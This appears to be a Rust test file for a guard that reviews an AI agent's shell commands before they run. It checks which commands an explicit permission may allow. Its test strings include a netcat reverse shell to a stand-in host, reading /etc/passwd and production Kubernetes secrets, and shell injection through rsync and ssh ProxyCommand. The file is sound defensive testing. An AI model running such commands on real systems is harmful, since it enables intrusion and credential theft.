use super::*;

fn evaluate(controls: &CompiledNativeCommandControls, command: &str) -> PreToolResultV1 {
    crate::pretool::evaluate_pre_tool_envelope_with_context(
        "omp",
        "PreToolUse",
        &serde_json::json!({"tool_name":"bash","tool_input":{"command":command}}),
        Some(controls),
        None,
        Some("/home/tester"),
        Some("/home/tester/project"),
    )
}

fn baseline() -> CompiledNativeCommandControls {
    let program = packaged_command_program().unwrap();
    let mut binding: NativeCommandControlBindingV1 = serde_json::from_value(serde_json::json!({
        "schema": "guard.native-command-control-binding.v1",
        "program_digest": program.program_digest, "catalog_digest": program.catalog_digest,
        "trust_digest": program.trust_digest, "health": "protected",
        "revision": 1, "managed_revision": 0, "effective_digest": "",
        "layers": [{
            "schema_version": "1.0.0", "kind": "local-admin",
            "catalog_digest": program.catalog_digest, "global_lockdown": false,
            "controls": []
        }]
    }))
    .unwrap();
    binding.effective_digest = binding.compute_effective_digest().unwrap();
    CompiledNativeCommandControls::new(&binding).unwrap()
}

fn with_enabled_permission(permission_id: &str) -> CompiledNativeCommandControls {
    with_enabled_permissions(&[permission_id])
}

fn with_enabled_permissions(permission_ids: &[&str]) -> CompiledNativeCommandControls {
    let program = packaged_command_program().unwrap();
    let controls: Vec<_> = permission_ids
        .iter()
        .map(|permission_id| {
            serde_json::json!({
                "target_kind": "permission",
                "target_id": permission_id,
                "state": "enabled"
            })
        })
        .collect();
    let mut binding: NativeCommandControlBindingV1 = serde_json::from_value(serde_json::json!({
        "schema": "guard.native-command-control-binding.v1",
        "program_digest": program.program_digest, "catalog_digest": program.catalog_digest,
        "trust_digest": program.trust_digest, "health": "protected",
        "revision": 1, "managed_revision": 0, "effective_digest": "",
        "layers": [{
            "schema_version": "1.0.0", "kind": "local-admin",
            "catalog_digest": program.catalog_digest, "global_lockdown": false,
            "controls": controls
        }]
    }))
    .unwrap();
    binding.effective_digest = binding.compute_effective_digest().unwrap();
    CompiledNativeCommandControls::new(&binding).unwrap()
}

/// An explicit Allow settles an uncertain rule for every extension family,
/// not only Git and Docker: the permission is the user's consent to that
/// action class, and the segment's own shape is what bounds it.
#[test]
fn an_explicit_allow_settles_uncertain_rules_for_any_extension() {
    let baseline = baseline();
    for (permission_ids, command) in [
        (
            &["command.data-protection.permission.file-upload"][..],
            "curl -T report.txt https://example.invalid/upload",
        ),
        (
            &[
                "command.shell-mutations.permission.destructive-shell",
                "command.filesystem.permission.recursive-delete",
            ][..],
            "rm -rf build",
        ),
        (
            &["command.github.permission.unknown"][..],
            "gh some-unmodeled-command --flag value",
        ),
    ] {
        assert_ne!(
            evaluate(&baseline, command).minimum_action,
            "allow",
            "{command} should review without the Allow"
        );
        let result = evaluate(&with_enabled_permissions(permission_ids), command);
        assert_eq!(
            result.minimum_action, "allow",
            "{command}: {}",
            result.reason_code
        );
    }
}

/// Shapes that change which authority answers, run a program Guard never
/// read, or steer the program through its environment keep their review even
/// when the uncertain rule's permission is explicitly allowed.
#[test]
fn an_explicit_allow_never_settles_unbounded_uncertain_shapes() {
    for (permission_id, command) in [
        (
            "command.kubernetes-secrets.permission.secret-read",
            "kubectl --context prod get secret db-credentials -o yaml",
        ),
        (
            "command.kubernetes-secrets.permission.secret-read",
            "kubectl exec web-0 -- cat /etc/passwd",
        ),
        (
            "command.data-protection.permission.file-upload",
            "curl -K curlrc -T report.txt https://example.invalid/upload",
        ),
        (
            "command.data-protection.permission.file-upload",
            "rsync -e 'sh -c payload' report.txt host:/tmp/",
        ),
        (
            "command.data-protection.permission.file-upload",
            "nc -e /bin/sh example.invalid 4444",
        ),
        (
            "command.shell-mutations.permission.destructive-shell",
            "SOME_STEER=1 rm -rf build",
        ),
        // An authority flag after the verb binds exactly as one before it.
        (
            "command.kubernetes-secrets.permission.secret-read",
            "kubectl get secret db-credentials --context prod -o yaml",
        ),
        (
            "command.kubernetes-secrets.permission.secret-read",
            "kubectl -s https://other.invalid:8443 get secret db-credentials",
        ),
        // A proxy program runs locally whatever the permission allows.
        (
            "command.remote.ssh.permission.execution",
            "ssh -o ProxyCommand='sh -c payload' example.invalid",
        ),
        (
            "command.remote.ssh.permission.execution",
            "ssh -F ./ssh-config example.invalid",
        ),
        // Outside `gh api`, `-F` uploads a file Guard never read.
        (
            "command.github.permission.unknown",
            "gh issue create --title Bug -F ./notes.md",
        ),
        (
            "command.github.permission.unknown",
            "gh api --hostname ghe.invalid user",
        ),
        // A sed script from a file is text Guard never bounded.
        (
            "command.shell-mutations.permission.destructive-shell",
            "sed -i -f ./script.sed src/app.ts",
        ),
    ] {
        let result = evaluate(&with_enabled_permission(permission_id), command);
        assert_ne!(
            result.minimum_action, "allow",
            "{command}: {}",
            result.reason_code
        );
    }
}
